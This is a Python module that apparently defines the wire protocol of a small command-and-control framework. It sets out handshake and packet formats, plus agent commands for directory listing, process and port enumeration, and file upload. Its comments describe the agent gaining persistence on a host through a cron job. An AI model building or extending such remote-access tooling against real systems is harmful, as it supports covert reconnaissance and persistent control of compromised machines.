import struct



HANDSHAKE_COMMAND_ID = 9999
LISTDIR_COMMAND_ID = 1
WALKDIR_COMMAND_ID = 2
RUNNING_PROCESSES_COMMAND_ID = 3
FILE_UPLOAD_COMMAND_ID = 4
NETWORK_CONNECTIONS_COMMAND_ID = 5


COMMANDS_ID_TO_DESCRIPTION = {
    LISTDIR_COMMAND_ID: "ListDir",
    WALKDIR_COMMAND_ID: "WalkDir",
    RUNNING_PROCESSES_COMMAND_ID: "Get running processes",
    FILE_UPLOAD_COMMAND_ID: "Upload file",
    NETWORK_CONNECTIONS_COMMAND_ID: "List listening TCP ports and their processes",
}

# Define the format string for the packet with big-endian byte order
# '>' - big-endian (network byte order)


COMMAND_ID_PACKET_FORMAT = ">I"  # 'I' - 4-byte uint : the command_id
HANDSHAKE_PACKET_FORMAT = ">BB8s"  # Total size 10 ; 1 byte (request=1, response=2), 1 byte (status_none= 0, status_ok=1, status_error=2),  8-byte string - agent_uuid
COMMAND_PAYLOAD_PACKET_FORMAT = ">BBI" #Total size 6 ; 1 byte (request=1, response=2), 1 byte (status_none= 0, status_ok=1, status_error=2),  4-byte uint - size of upcoming payload to recv()
FILE_UPLOAD_PACKET_FORMAT = ">BBII" # Total size 10 ; 1 byte (request=1, response=2), 1 byte (status_none= 0, status_ok=1, status_error=2),  4 byte uint - size of file path to recv(), 4 byte uint - size of file data to recv()


MESSAGE_REQUEST = 1
MESSAGE_RESPONSE = 2

MESSAGE_STATUS_NONE = 0
MESSAGE_STATUS_OK = 1
MESSAGE_STATUS_ERROR = 2

DEFAULT_RECV_BUFFER = 4096

#flow will look like this
# 1. C2 (acting as client) ->TCP CONNECT ->  agent(acting as server)
#      handshake starts
# 2. agent sends agent_hello() -> C2 receives and perform agent init
#      (checks if uuid allowed to communicate with C2, create output dir etc)
#      handshake completes
# 3. C2 sends c2_hello() -> agent receives connect request success/fail
#     if fail -> agent exit
#     if success -> agent waits for incoming commands
#4. Agent gains oldpersistency on server via cron job (allow server to start if not already started)
# 5. C2 receives commands from user's UI and send to agent
# 6. agent executes and sends response to C2


# Typical Command packet format: (COMMAND_PAYLOAD_PACKET_FORMAT)

# #   0               1               2               3
#     0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7
#    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#    |                        Command ID
#    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#    |type(req/resp)|     status    |    size                  of
#    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#       upcoming      payload       | payload ( based on size-of-payload)
# #



# File upload command packet format: (FILE_UPLOAD_PACKET_FORMAT)

# #   0             1               2               3
#     0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7
#    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#    |                        Command ID
#    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#    |type(req/resp)|     status    |    size                  of
#    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#       file         path           |    size                  of
#    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#       upcoming      payload       | file path ( based on size-of-file-path)
#    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#       ...
#    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#        payload ( based on size-of-payload)
# #



def pack_command_id(command_id: int):
    return struct.pack(COMMAND_ID_PACKET_FORMAT, command_id)


def receive_command_id(s):
    command_id = s.recv(4)
    # Unpack the 4-byte command_id as int (big-endian)
    return struct.unpack(COMMAND_ID_PACKET_FORMAT, command_id)[0]  #  [0]  is needed because unpack always return tuple


def handle_init_handshake_receive(s):
    command_id = receive_command_id(s)
    if command_id != HANDSHAKE_COMMAND_ID:
        raise TypeError(f"[-] Receive wrong command id {command_id} instead of {HANDSHAKE_COMMAND_ID} in handle_init_handshake_receive()")

    message_type, status, agent_uuid = struct.unpack(HANDSHAKE_PACKET_FORMAT, s.recv(10))
    return message_type, status, agent_uuid.decode()


def handle_init_handshake_send(s, agent_uuid, message_type, status=MESSAGE_STATUS_NONE):
    s.sendall(
        (pack_command_id(HANDSHAKE_COMMAND_ID) +
         struct.pack(HANDSHAKE_PACKET_FORMAT, message_type, status, agent_uuid.encode()))
    )


def receive_payload(s, payload_size):
    # receives big payload with payload_size by chunks of DEFAULT_RECV_BUFFER

    if payload_size == 0:
        return ""

    print(f"[+] Trying to receive total {payload_size} bytes")
    payload = b''
    bytes_received = 0
    # Receive data in chunks until the expected size is met
    while bytes_received < payload_size:
        # Receive a chunk of data (e.g., 4096 bytes at a time)
        chunk = s.recv(DEFAULT_RECV_BUFFER)
        if not chunk:  # If no more data is received, break the loop
            break
        payload += chunk  # Append the chunk to the buffer
        bytes_received += len(chunk)  # Update the total bytes received

        print(f"[+] Received {len(chunk)} bytes, total received: {bytes_received}/{payload_size}")

    # Verify if the total received data matches the expected size
    if bytes_received == payload_size:
        print("[+] Full payload received successfully")
    else:
        raise Exception(f"[-] Expected {payload_size} bytes, but received {bytes_received} bytes")

    return payload
